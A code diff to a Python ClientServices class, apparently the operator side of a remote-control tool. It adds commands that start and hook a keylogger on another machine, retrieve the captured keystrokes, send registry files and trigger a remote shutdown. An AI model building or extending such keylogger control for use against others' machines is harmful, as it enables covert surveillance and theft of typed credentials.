@@ -26,9 +26,11 @@ class ClientServices:
         print('SEND CLOSE SIGNAL')
 
         self.buff.send('close!F!'.encode())
-        self.buff.close()
-        self.client = None
-        self.buff = None
+        try:
+            self.client.close()
+        finally:
+            self.client = None
+            self.buff = None
     
     # dump func
     def sendDump(self, var):
@@ -86,16 +88,27 @@ class ClientServices:
 
     # keylogger func
     def keylogger_Start(self):
+        print('REQUEST BEGIN KEYLOGGER')
         self.buff.send('keylogger!F!'.encode())
 
+    def keylogger_CommandHook(self):
+        print(f'\tSend keylogger command: hook')
+        self.buff.send('hook'.encode() + self.DELIM)
+
+        return self.buff.recv_until(self.DELIM).decode()
+
     def keylogger_Command(self, cmd):
+        print(f'\tSend keylogger command: {cmd}')
         self.buff.send(cmd.encode() + self.DELIM)
 
     def keylogger_Send(self):
+        print('\tRequest keylogger data')
         self.keylogger_Command('send')
+
         return self.buff.recv_until(self.DELIM).decode()
 
-    # send Reg
+
+    # registry func
     def sendRegFile(self, data):
         print('SEND REG FILE')
         self.buff.send('regfile!F!'.encode())
@@ -142,3 +155,8 @@ class ClientServices:
         self.buff.send(path.encode() + self.DELIM)
 
         return self.buff.recv_until(self.DELIM).decode()
+
+    # shutdown func
+    def sendShutdown(self):
+        print('SEND SHUTDOWN SIGNAL')
+        self.buff.send('shutdown!F!'.encode())
